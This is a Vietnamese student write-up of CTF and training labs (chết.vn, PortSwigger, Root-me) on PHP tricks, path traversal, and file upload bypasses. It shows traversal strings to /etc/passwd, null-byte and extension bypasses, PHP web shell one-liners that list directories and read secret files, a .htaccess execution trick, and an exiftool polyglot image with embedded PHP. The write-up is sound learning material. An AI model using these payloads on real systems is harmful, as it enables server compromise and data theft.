## Trần Mạnh Huy - Các chall về lfi - rfi - path traversal - File upload vulnerabilities

* [Chết.vn](#chetvn)
    - [Chall 5:](#chall-5)   
    - [Chall 7:](#chall-7)
    - [Chall 10:](#chall-10)
* [Portswigger - File Path Traversal](#path-traversal)
    - [1. Lab: File path traversal, simple case](#ppt1)
    - [2. Lab: File path traversal, traversal sequences blocked with absolute path bypass](#ppt2)
    - [3. Lab: File path traversal, traversal sequences stripped non-recursively](#ppt3)
    - [4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](#ppt4)
    - [5. Lab: File path traversal, validation of start of path](#ppt5)
    - [6. Lab: File path traversal, validation of file extension with null byte bypass](#ppt6)
* [Portswigger - File upload vulnerabilities](#postswigger-upload-file)
    - [1. Lab: Remote code execution via web shell upload](#pulv1)
    - [2. Lab: Web shell upload via Content-Type restriction bypass](#pulv2)
    - [3. Lab: Web shell upload via path traversal](#pulv3)
    - [4. Lab: Web shell upload via extension blacklist bypass](#pulv4)
    - [5. Lab: Web shell upload via obfuscated file extension](#pulv5)
    - [6. Lab: Remote code execution via polyglot web shell upload](#pulv6)

* [Root me - Upload file](#rootme-upload-file)
    - [1. File upload - Double extensions](#rfu1)
    - [2. File upload - MIME type](#rfu2)
    - [3. File upload - Null byte](#rfu3)
    - [4. File upload - ZIP](#rfu4)
* [Root me - Local file inclusion](#rlfi)
    - [1. Local File Inclusion](#rlfi1)
    - [2. Local File Inclusion - Double encoding](#rlfi2)
    - [3. Local File Inclusion - Wrappers](#rlfi3)
    - [4. Remote File Inclusion](#rlfi4)


# Chết.vn<a name="chetvn"></a>

**Mình** viết nốt các chall tuần trước chưa làm được.

## [Chall 5:](https://xn--cht-8jz.vn/challenge/5/)

```
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
if(isset($_GET['inp'])) {
    $inp = $_GET['inp'];
    if(((array)simplexml_load_string(file_get_contents($inp))->f->l->a->g)[0] === 'flagggggggggggggg') {
        die(print_flag(5));
    }
}

highlight_file(__FILE__);

```
Ở đây file_get_contents() để lấy nội dung tệp xml được truyền vào qua đường dẫn, 1 chức năng của file_get_contents là có thể đọc file từ đường dẫn, và 
trả về dưới dạng chuỗi. Tiếp theo simplexml_load_string dùng để phân tích chuỗi xml được trả về thành đối tượng SimpleXML. Đối tượng này cho phép truy cập
các phần tử của xml dưới dạng đối tượng. Vì vậy ở đây ý tưởng là ta tạo 1 file xml có đủ nội dung như điều kiện và dựng local rồi post file lên và gọi 
tệp qua đường dẫn bằng ngrok.

Tạo file: 

![image](https://user-images.githubusercontent.com/104350480/223001295-3e042785-4cdf-46d3-a9b1-18c830741447.png)

Dựng server:

![image](https://user-images.githubusercontent.com/104350480/223001424-636a2ec4-26f5-43be-be62-ff945efcd0b7.png)

Dùng curl post file test.xml lên: 

![image](https://user-images.githubusercontent.com/104350480/223001590-b8f7e6b3-0ef5-46a8-8af5-7c8bd3e01668.png)

Thực hiện GET ta được flag: 

![image](https://user-images.githubusercontent.com/104350480/223001682-82ac285b-2493-4e70-9de1-fa189ca3092d.png)

> FLAG{19ee9d17-7f23-4c03-b702-4276246ccdb2}

### [Chall 7:](https://xn--cht-8jz.vn/challenge/7/)

```
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
$user = ['admin', 'lord'];
if(isset($_GET['u'])) {
    if($_GET['u⁠'] === $user && $_GET['u'][0] !== 'admin') {
        die(print_flag(7));
    }
}
highlight_file(__FILE__);

```
Chall này giải quyết trực tiếp thì cũng kh ra được gì, ném vào visual code ta thấy có cái bất thường:

![image](https://user-images.githubusercontent.com/104350480/223001954-43b718a1-9860-427b-978c-8b012c669748.png)

Có u+2060 (word joiner) bị ẩn, làm cho điều kiện thực thi của ta nghĩ kh còn đúng nữa. Search được thì u+2060 có thể chuyển về dạng utf-8 như sau:

> E2 81 A0

Ta dựa vào đây để viết url thỏa mãn điều kiện bài:

![image](https://user-images.githubusercontent.com/104350480/223002789-9455b43c-40a6-4a65-81a5-3c8e1afd361e.png)

> FLAG{07af425c-fc46-4689-aaf6-5512e4271f63}

### [Chall 10:](https://xn--cht-8jz.vn/challenge/10/)

```
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
class Get_Flag{
    public $get = True;
    public function __destruct(){
        if($this->get === True){
            die(print_flag(10));
        }
    }
    public function __wakeup(){
        $this->get = False;
    }
}
if(isset($_GET['get_flag.php'])){
    unserialize($_GET['get_flag.php']);
}
highlight_file(__FILE__);

```

Bài này thì ta kh thể truyền param là get_flag.php trực tiếp vào được như thế thì sẽ bị sai vì trong php không được truyền dấu '.' vào như thế.
Ở đây có 1 trick là có cả _ và . được cùng xuất hiện nên nếu ta dùng \[ thì nó sẽ được convert thành _ . Và cũng như mình tham khảo được thì khi 
\[ và . cùng xuất hiện trong các version php < 8 thì nó sẽ kh bị lỗi nữa.

> link reference: https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/sekai-game-start/solution

Tiếp theo là làm thế nào để gọi được hàm ```__destruct()``` để trả về flag. Hay là cần bypass hàm wakeup(), vì vậy ý tưởng ở đây là ta sẽ truyền vào 1
chuỗi dưới dạng class chứ kh truyền vào dưới dạng đối tượng thì hàm wakeup() sẽ không được gọi ra:

![image](https://user-images.githubusercontent.com/104350480/223005027-74c6a30b-c96c-41ad-a183-f9e1a559febe.png)


> FLAG{e4bd6b96-9c8b-4b30-8ffc-7ba57770c123}


# Portswigger - File Path Traversal<a name="path-traversal"></a>

### [1. Lab: File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)<a name="ppt1"></a>

Chall giới thiệu về file path traversal, load trang web và thấy đường dẫn ảnh với param là filename, chuyển thành ../../../etc/passwd để truy cập là xong: 

![image](https://user-images.githubusercontent.com/104350480/222962685-9ceb4899-1e03-453e-865a-324a28f530b8.png)

### 2. [Lab: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)<a name="ppt2"></a>

Cái này chỉ cần chuyển thành filename=/etc/passwd là xong, vì cái này là do trang web nó block ../ nhưng mà lại coi tên tệp được cung cấp như 1 thư mục làm việc mặc định:

![image](https://user-images.githubusercontent.com/104350480/222962841-b4810a0f-911f-400a-aa12-97a8ceab53df.png)

### [3. Lab: File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)<a name="ppt3"></a>

Lab này chỉ đơn giản là ta test vài trường hợp như kiến thức đã học thì nó thuộc dạng filter nhưng kh đệ quy:

![image](https://user-images.githubusercontent.com/104350480/222963091-a38cfb4a-303a-4b6e-b49d-1a22f859c52c.png)

### [4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)<a name="ppt4"></a>

Bài này thì nó lọc đi / bằng cách decode url ra rồi nếu có thì lọc, thì ta encode 2 lần thì url sau khi deocde ra vẫn sẽ được hiểu:

![image](https://user-images.githubusercontent.com/104350480/222963210-a20b40b0-adec-4e4b-ab08-936f27612eb4.png)

### [5. Lab: File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)<a name="ppt5"></a>

Nhìn qua ta cũng biết được dạng này nó giống như trong tài liệu đã đọc, nó thuộc dạng yêu cầu đường dẫn phải có sẵn, như trong bài đọc là file languages được mặc định yêu 
cầu thì ở đây cũng vậy /var/www/images cũng phải có kh thì sẽ bị báo lỗi. Ta để nguyên rồi thêm ../ đủ  thì thôi là được: 

![image](https://user-images.githubusercontent.com/104350480/222963342-88597dff-d5cc-4b03-b96c-0c05e555f6d8.png)

### [6. Lab: File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)<a name="ppt6"></a>

Đọc tên đề là biết dạng null byte rồi, test ../../../etc/passwd%00 nhưng trả về no file, thử tiếp thì cũng kh được, có vẻ là nó kh phải thêm file mà là phải dạng jpg thì
nó mới chấp nhận, vậy bypass thì thêm đuôi jpg vào sau null byte là được, đằng nào cũng mất:

![image](https://user-images.githubusercontent.com/104350480/222964011-a29abf86-afa5-4df6-879c-0c7c8f60dbb0.png)

## Portswigger - File upload vulnerabilities<a name="portswigger-upload-file"></a>

### [1. Lab: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)<a name="pulv1"></a>

```
 This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

```

Dạng này là upload file, nó áp dụng luôn cả lfi và rce cho ta rồi, triển thôi. Ném vào kali tạo file cho nhanh.

![image](https://user-images.githubusercontent.com/104350480/222968464-1be01e51-8c26-442c-9ace-28c483fc7b7b.png)


Ta tạo file php với lệnh ls để liệt kê thư mục và xem đường dẫn. Vì ta thực hiện POST nên ta cũng có thể thực hiện GET để thực thi nội dung đã up lên,
bài đầu này thì không filter gì hết nên ta sẽ thực thi trên burp suite như sau: 

POST:

![image](https://user-images.githubusercontent.com/104350480/222968549-4bfbaf19-b5a7-4073-8fa2-a42ab6cdd929.png)

GET: 

![image](https://user-images.githubusercontent.com/104350480/222968559-0a2e43d1-ec92-4530-a9f4-dac99ee12abc.png)

Ta cứ sửa nội dung file php truyền lên bên phần POST rồi thực thi GET cho đến khi ra được vấn đề thì thôi :))

> <?php system('ls /home/'); ?>
> <?php system('ls /home/carlos'); ?>

![image](https://user-images.githubusercontent.com/104350480/222968663-1b8b13ed-493b-4c7d-9d03-cd6cd9d16242.png)

Có file secret, vậy thì ta chuyển sang dạng đọc file thôi:

> <?php system('cat /home/carlos/secret'); ?>

![image](https://user-images.githubusercontent.com/104350480/222968730-016d6c94-38af-4d7e-a1c5-c827e0c861b0.png)

> 8HIdnM5LZgY1n6gLElfNjgP6GXYTjUn4

### [2. Lab: Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)<a name="pulv2"></a>

```
This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

```

Bài này vẫn như bài trước thôi nhưng mà nó có thêm cái gì đấy liên quan đến Content-type. Ném vào burpsuite rồi upload file như chall 1 xem sao.

![image](https://user-images.githubusercontent.com/104350480/222968915-e63189a5-91dd-4852-9ed3-dd33eb68d3fd.png)

Ò hó, có filter nhẹ rồi. Thế thì để upload thì thêm đuôi jpg vào file portswigger.php mình định up lên xem sao

![image](https://user-images.githubusercontent.com/104350480/222969040-5309ee2d-5645-4830-8c98-be6f09e30327.png)

![image](https://user-images.githubusercontent.com/104350480/222969080-01f41774-0a47-41d6-9878-4cdd33448855.png)

Vậy là up lên thành công rồi, nhưng mà cứ để vậy thì có vẻ không ổn lắm, giờ miễn là content type là image/jpeg thì mình post gì cũng được, kiểu nó là
vậy rồi, do check code nó vậy. Giờ xóa đuôi png nãy thêm vào rồi gửi thôi ta được kết quả như bài trước: 

> Link reference: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf?_gl=1*1d5xuaq*_ga*NzM2OTE5OTkuMTY2OTA4MzExMA..*_ga_SRYSKX09J7*MTY3ODAzNDMzMy4xNDMuMS4xNjc4MDM0MzUyLjAuMC4w

![image](https://user-images.githubusercontent.com/104350480/222975992-00cc720b-97dd-4d56-aff2-f8dde6c45664.png)

![image](https://user-images.githubusercontent.com/104350480/222976082-7922aea2-9113-42be-ace2-24744ec18ab9.png)


### [3. Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)<a name="pulv3"></a>

```
 This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

``` 

Bài này có liên quan đến path traversal, vì nếu để trực tếp param truyền vào tại filename thì đã bị filter hết rồi

![image](https://user-images.githubusercontent.com/104350480/223011930-6b7b96b2-5683-4d4b-8a73-ddf7aa6b5193.png)

Để như vậy thì xem phản hồi ta thấy bị sai rồi, ta encode / về %2f xem sao: 

![image](https://user-images.githubusercontent.com/104350480/223012016-0838b94d-0945-406d-bf46-954772265b46.png)

Có vẻ đúng rồi, ta triển khai tiếp bên GET và thực hiện thành công, h chỉ cần sửa lại nội dung file trực tiếp trên burp như mấy trên là xong:

![image](https://user-images.githubusercontent.com/104350480/223012155-a8ef18d0-6384-46c5-8ddd-d3bb6405dece.png)


### [4. Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)<a name="pulv4"></a>

```
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

```

Chall này thì như tên bài, nó đã blacklist đi php, thực ra thì mình có thử 1 số cách viết khác của php5 hay php6 thì vẫn upload được nhưng mà khi thực thi
thì nó kh chạy mà chỉ đọc các câu lệnh của mình ra thôi. Thì vấn đề ở đây có lẽ kh phải vậy rồi, đọc tài liệu tí về chall này thì nó có diễn giải ngắn gọn
thế này, thông thường thì 1 số server sẽ không thực thi 1 file trừ khi nó được cấu hình để làm việc đó. Đúng thế đọc đến đây thì có thể nói là các chall trước
ta làm là server đang được cấu hình như vậy. Nhưng mà để hiểu sâu hơn thì ta có thể tham khảo video này trong việc học về upload file:

> https://www.youtube.com/watch?v=ttj7_uL4xPA&t=73s

Tóm gọn lại thì trong video này sẽ nói cách để học về kiến thức upload file vul tốt hơn:

```
Đầu tiên ta cần biết về khái niêm httpd, httpd (httpdaemon) là trái tim của 1 web server, nó sẽ là nơi đầu tiên nhận lấy và xử lí gói tin http của người dùng
gửi đến, hiểu rõ về httpd sẽ giúp ích ta rất nhiều về vul này: 

- Để 1 trang web hoạt động thì rõ ràng cần có server và trình duyệt web, giữa trình duyệt và web server sẽ trao đổi với nhau thông qua 1 cái gội là http gồm
có http request và http response. Thế sâu bên trong server gồm những thành phần gì và có những gì đang chạy ? Thì để có thể xử lí được các gói tin http thì
nó cần có 1 phần phềm gọi là httpd, là 1 dịch vụ chạy ngầm, và nó chịu trách nhiệm xử lí những gói http request và trả về response cho người dùng. Thì có rất
nhiều phần mềm httpd nổi tiếng, và 1 trong số đó chính là apache và nginx,... Phần này video cũng tập trung và httpd của apache.

_ Để 1 httpd chạy được thì ta cần nạp cho nó 1 cái cấu hình, 1 thông số quan trọng và cần quan tâm trong upload file lúc này chính là document root, giá trị
của nó là một đường dẫn /var/www/html/ , đường dẫn này sẽ được sử dụng khá là nhiều. Vậy document root này là gì ? Đơn giản là nó chứa đường dẫn tới thư mục
mà ở thư mục này nó chứa tất cả tài nguyên của trang web này, ví dụ như file home.html, index.php,... mà a dev viết nên, nó sẽ nằm tất cả trong này. Thì
khi nhận được 1 request GET /home.html thì httpd nó sẽ vào document root và tìm cái tài nguyên hay file có tên như vậy, và nó sẽ trả về nội dung của file
được GET này. Ồ hố khá hay đúng kh nhỉ? Ở đây thì có nhiều ngôn ngữ được tạo ra để xử lí ở server side nhưng mà cũng đang học mỗi php nên video này cũng
tập trung vào php luôn thì cũng hợp lí. Thì http nó xử lí 1 file php như thế nào? Khi mà có 1 cú request mà đuôi của nó là index.php như các file php
mà ta vẫn upload chẳng hạn thì một httpd apache thì nó sẽ kh xử lí được các yêu cầu liên quan đến php, vậy nên khi mà có dịp cài đặt php thì nó sẽ có 1 
dòng là:
> libapache2-mod-php
Đây là 1 module được hiểu đơn giản là cầu nối giữa httpd và php, giúp httpd thực hiện được các đoạn code trong php, thì khi ta gửi file index.php ấy thì 
theo thứ tự sẽ là httpd đọc file index.php, nó cũng giống như trên nhưng khác cái là nó thấy file này kết thúc bằng extension là .php, nó sẽ truyền file này
qua cho module libapache2-mod-php để xử lí, thì sau khi module này xử lí xong thì nó sẽ trả về kết quả cho apache và rồi cuối cùng httpd apache mới trả
kết quả thực thi về cho người dùng.

```
Oke giờ ta đã hiểu 1 phần tổng quát cách thức xử lí và hoạt động ở phía server. Giờ ta cần áp dụng nó để giải quyết chall này.
Như nói ở phần trên thì các máy chủ sẽ kh thực thi file php nếu nó kh được cấu hình để làm như vậy, như module libapache2-mod-php được cài chẳng hạn.
Hay ví dụ cụ thể ở đây là trước khi apache thực hiện các tệp do request bên phía client yêu cầu thì dev có thể thêm các lệnh sau vào tệp **/etc/apache2/apache2.conf** của họ:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php

```
Đồng thời thì cũng có nhiều máy chủ cho phép các dev tạo các tệp được cấu hình đặc biệt trong các thư mục cá nhân của họ để ghi đè hoặc thêm 1 hoặc nhiều
global setting. Ví dụ với apache server sẽ load 1 cấu hình dành riêng cho thư mục từ 1 file được gọi là .htaccess nếu có.

Còn 1 trường hợp nữa trong phần tìm hiểu về upload file vul mà trang này có đề cập là các dev có thể cấu hình riêng cho thư mục của IIS (internet information
service là 1 http server được phát triển bởi microsoft chạy trên window) bằng cách sử dụng file web.config. Điều này có thể bao gồm các chỉ thị như sau, 
trong trường hợp này cho phép các tệp JSON được phục vụ cho người dùng:

![image](https://user-images.githubusercontent.com/104350480/223177831-439e0938-49c4-40d1-aa81-cc7697096414.png)

Nói chung tùy vào cách mà server cấu hình mà ta có thể thực hiện các việc khai thác khác nhau. Để xem ta có thể áp dụng gì vào chall này không. 
Thường thì file php của ta sẽ được thực thi thông qua 1 số trên, nhưng mà toàn bị chặn là chính chứ có được đi qua nó để xử lí đâu. Vì vậy ta phải
nghĩ xem làm sao để có thể làm file php được thực thi qua mấy th được kể ở trên.

Ý tưởng ở đây là ta POST file hợp lệ lên đã, sau đó ta sẽ lợi dụng  **.htaccess** đề cập ở trên đề cập ở trên để ghi đè lên tệp cấu hình server.
Tại sao lại là .htaccess thì ở đây tại th apache, httpd có thể thực hiện 1 tệp php theo request đã được cấu hình sẵn cho phép load module nào hoặc thêm các
extension sẽ được thực thi nếu muốn. Nghe hay phải không??? Cụ thể cái ghi đè ở đây là như nào, thì nhiều server sẽ cho phép ô dev upload ghi đè tệp hoặc
thêm content vào tệp config. Ví dụ như trong apache server thì nó cho phép ta upload 1 file cụ thể được cấu hình cụ thể cho server nếu như server tồn tại
file **.htaccess**. Ý tưởng là vậy rồi, vào giải quyết chall luôn cho dễ hiểu, mình ngẫm 1 hồi mới hiểu, hiểu rồi thì thấy hay vđ :))

#### Đầu tiên ta thực hiện việc upload file lên php5 đã hoặc file gì cũng được miễn là hợp lệ, đằng nào chẳng sửa lại qua burpsuite:

![image](https://user-images.githubusercontent.com/104350480/223183853-0ce4f4e6-8a15-4509-822c-1067bbdec3e5.png)

Nhưng mà thực hiện get thì chả được gì vì nó đâu có thực thi giúp ta file này đâu. Tiếp theo như ý tưởng ở trên, ta post file **.htaccess** để server nó 
nhận được đã, để thực hiện được các bước sau: 

![image](https://user-images.githubusercontent.com/104350480/223184233-223bf2e4-a3d4-4d85-ae37-f66b361fa208.png)

Oke vậy là file **.htaccess** đã được up lên thành công rồi, vậy thì tiếp theo của ý tưởng sẽ là ghi đè hay thêm extension mà httpd sẽ nhận và xử lí được
Ở đây mình thêm .manhhuy2002 :

![image](https://user-images.githubusercontent.com/104350480/223184710-4c8352c7-b56f-448a-81bb-d8357cb62342.png)

Oke ngon rồi, à quên thêm rồi POST lại nhé. Oke giờ th server nó sẽ chấp nhận và xử lí các file có extension là .manhhuy2002 rồi.
Giờ ta post lại file php5 xong sửa lại extension thành .manhhuy2002 thôi, và tất nhiên h th httpd cùng th module libapache2-mod-php trong bài này sẽ giúp
ta thực thi code php: 

Thử nhẹ ls / phát:

![image](https://user-images.githubusercontent.com/104350480/223185373-66ddc4bd-bf1c-4158-80e7-5702f4187f45.png)

Bên thực hiện request GET file sẽ được:

![image](https://user-images.githubusercontent.com/104350480/223185444-1e99297f-0fc7-4644-81a2-00d0ec14b1e0.png)

Oke vậy là xong rồi, giờ thực hiện tương tự như các chall trên thôi: **<?php system('cat /home/carlos/secret');?>** để đọc file secret: 
Get lại lần nữa ta xong solution bài lab:

![image](https://user-images.githubusercontent.com/104350480/223185831-c43c9261-6a49-45b1-afb0-48122103d8d9.png)

Bài này mình thấy khá hay, kiểu phải hiểu bản chất nên mình lúc chưa hiểu bị hơi lòng vòng tí :(((

### [5. Lab: Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)<a name="pulv5"></a>

```
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

```

Bài này thì đơn giản, chỉ là bypass cái extension thôi, ta thêm .png vào để hợp lệ nhưng mà muốn vẫn giữ được là file php thì ta thêm null byte vào ngay sau
là được. Cụ thể 2.php%00.png

![image](https://user-images.githubusercontent.com/104350480/223202291-e113c6c3-615f-4a24-be28-ed137b6c4d4e.png)

Oke thế là bypass được, vì sau khi qua server xử lí thì sau cái %00 cũng mất rồi, nên là còn lại là 2.php thôi. Ta thực hiện GET file, lần này check burp
kh thấy GET file trả về thì ta check source để lấy đường dẫn và thực hiện request get: 

![image](https://user-images.githubusercontent.com/104350480/223202608-0f2f2a2d-acdf-41be-b5fd-88944cddad78.png)

Oke thành công r, vậy tương tự như trên ta giải quyết được chall này: 

![image](https://user-images.githubusercontent.com/104350480/223202824-dd27f970-9458-4c1c-abf1-66e98df3b6ec.png)


### [6. Lab: Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)<a name="pulv6"></a>

Ở bài lab này, các server sẽ không đơn thuần kiểm tra extension hay content-type được truyền vào nữa, thay vào server sẽ các thực nội dung của file để biết được nó là loại file gì, chủ yếu là kiểu dạng hex. Ta có thể lấy ví dụ điển hình là các hình ảnh jpeg luôn bất đầu bằng chuỗi bytes **FF D8 FF**
Bài lab này sẽ dạy chúng ta cách thực hiện bypass mà không thể tác động vào các extension như các bài lab trước nữa:

```

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

```

Như đã nói ở trên thì các định dạng được cho phép chỉ là các jpeg hay png, ta dù thay đổi hay dùng các trick ở extension thì sẽ đều kh hiệu quả.

![image](https://user-images.githubusercontent.com/104350480/223076635-504d3dbe-d0c6-4072-8d4d-43c63d61bd9d.png)

Đọc gợi ý của bài thì ta phải dùng một cái gọi là polygot file, ta có thể hiểu polygot file nó là 1 loại file truyền tin mà sẽ hợp lệ với nhiều kiểu file khác nhau. Ví dụ như gifar file vừa là 1 file gif và vừa là 1 file rar. Tức là đầu đề đã gợi cho ta 1 ý tưởng là tạo 1 polyglot file để vừa thỏa mãn
việc xác thực hệ thống vừa thỏa mãn có thể thực thi code. Nói thì hơi ngược, nhưng tức là thay vì như các bài trước ta tác động vào extension hay content-type thì ta bh ta sẽ phải tác động vào nội dung bytes trong file. Ví dụ như file jpeg bắt đầu vối FF D8 và kết thúc bằng FF D9 chẳng hạn,....

Hiểu được cấu trúc của file sẽ giúp ta thay đổi được bytes hay metadata của nó sao cho phù hợp. Ở đây ta sẽ dùng 1 công cụ hữu hiệu để tác động vào nó là **exiftool** giúp có thể tác động hữu hiệu vào metadata của file. Ta sẽ sử dụng nó để thay đổi các dấu hiệu hay signature trong file để server bị 
đánh lừa rằng đây  là 1 file hình ảnh hợp lệ. 

Đầu tiên thì tải 1 ảnh jpg hay có sẵn thì dùng luôn, ta 
Ta sẽ thêm cmd: -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"
vào file portswigger.php và nhờ exiftool thực hiện nó.

![image](https://user-images.githubusercontent.com/104350480/223383964-487828e0-39fc-4b3c-953a-a6d426d1e3c6.png)

Oke giờ nó đã có định dạng của 1 jpeg nhưng cũng đồng thời là 1 file php. 
Thực hiện upload và get ta được: 
    
![image](https://user-images.githubusercontent.com/104350480/223384360-c11796a5-9ca2-4c11-aada-b73cbca89675.png)


### [7. Lab: Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)<a name="pulv7"></a>

## Root me - Upload file<a name="rootme-upload-file"></a>

Mấy chall này chủ yếu dùng kiến thức trong related source được rootme cấp sẵn:

> link reference: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf?_gl=1*vt6jw*_ga*NzM2OTE5OTkuMTY2OTA4MzExMA..*_ga_SRYSKX09J7*MTY3ODAzOTcxMy4xNDQuMS4xNjc4MDM5NzE4LjAuMC4w

### [1. File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)<a name='rfu1'></a>

```
Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.

```

![image](https://user-images.githubusercontent.com/104350480/223013207-fe95da40-dd81-4445-bf53-eeb9ec5886ea.png)

Chỉ được **.gif, .jpeg , .png** được chấp nhận nên ta sửa lại đuôi, thêm .png vào file php là được.
Ta gửi file cái sang phần get đọc được luôn, vì vậy mà nó có tên double extension.

![image](https://user-images.githubusercontent.com/104350480/223013520-c3794348-52fc-485f-ab36-d07dcc27ee22.png)

Dùng find để tìm find .passwd: 

![image](https://user-images.githubusercontent.com/104350480/223016249-1df432b5-35a5-4aec-b7ce-275d35bd5a85.png)

Dùng cat để đọc file: 

![image](https://user-images.githubusercontent.com/104350480/223016429-029c6297-dc3b-4796-8ef4-bfd7ca8398d7.png)

> Flag: Gg9LRz-hWSxqqUKd77-_q-6G8

### [2. File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)<a name='rfu2'></a>

```
Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd.

```


Dạng này vẫn giống như dạng làm trên portswigger.
Đầu tiên bypass bằng cách sử dụng thêm đuôi .png vào file với nội dung sau rồi sau đó qua burp mình sửa lại sau:

![image](https://user-images.githubusercontent.com/104350480/223032185-b52a2a02-9f76-48c5-8db7-10da9fc2b5ce.png)

Sau vài lần thử thì tìm được find .passwd như trên, ta thực hiện lệnh cat để đọc file là có flag: 

![image](https://user-images.githubusercontent.com/104350480/223032326-6cbb3e58-c0b3-4a0c-aa00-8c12d6822ab4.png)

> Flag: a7n4nizpgQgnPERy89uanf6T4

### [Chall 3: File upload - Null byte](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)<a name='rfu3'></a>

```
Your goal is to hack this photo galery by uploading PHP code.

```

Bài này khá đơn giản, cũng tương tự như các chall trước, ta chỉ được up các file: **NB : only GIF, JPEG or PNG are accepted**, nếu như ý tưởng là thêm đuôi .png vào thì kh
được bài này nó đã filter double extension rồi, nên khi truyền lên với .php.png thì cũng fail, vậy ta chỉ cần thêm %00 vào sau như: .php%00.png vào là xong, vì sau khi thực 
hiện .png sẽ tự động bị cho out ra khỏi. còn lại mỗi extension là .php. Sau đó ta thực hiện đọc file và được password trả về luôn:

![image](https://user-images.githubusercontent.com/104350480/223034178-74c4ccdd-0756-4db0-a5d1-a9d58708a2d0.png)

> Flag: YPNchi2NmTwygr2dgCCF

### [Chall 4: File upload - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)<a name='rfu4'></a>

```
Your goal is to read index.php file.

```

Bài này thì thì như tiêu đề nó bắt ta upload 1 file zip, thì ta có thể zip file lại bằng cmd. Trước hết thì đọc chút related source mà rootme cung cấp đã.

> reference: https://repository.root-me.org/Administration/Unix/Linux/EN%20-%20Linux%20man%20page%20-%20zip.pdf

Nhưng mà tóm lại là chúng ta cần phải upload 1 file zip lên. Nhưng mà upload file zip thì đâu có thực thi được gì, nên ý tưởng ở đây là ta dùng symlink để khi file
zip được gọi thì 1 file ta symlink để thực thi mã code sẽ được gọi theo.

```
Lệnh ln trong linux (hay còn gọi là lệnh liên kết tệp) cho phép người dùng tạo liên kết giữa các tệp khác nhau trong thư mục. Lệnh ln này mặc định sẽ tạo ra hard link, 
tức là một tệp trỏ đến 1 tệp khác trong cùng 1 inode với tệp gốc. Còn loại liên kết nữa mà sẽ được dùng trong bài này là soft link (hay còn được gọi là sympolic link)
là 1 tệp đặc biệt chứa một đường dẫn đến tệp gốc : ln -s /path/to/source_file link_name

```

Ta tạo 1 file php mới và lần lượt thực hiện:

Tạo file index.php, nội dung file là gì cũng được vì cái cốt là ta muốn thực hiện path traversal đến file index.php để đọc file của máy chủ họ chứ kh phải thực thi code

![image](https://user-images.githubusercontent.com/104350480/223041176-9a168751-b18c-4bc8-af3a-73a87c9de0e1.png)

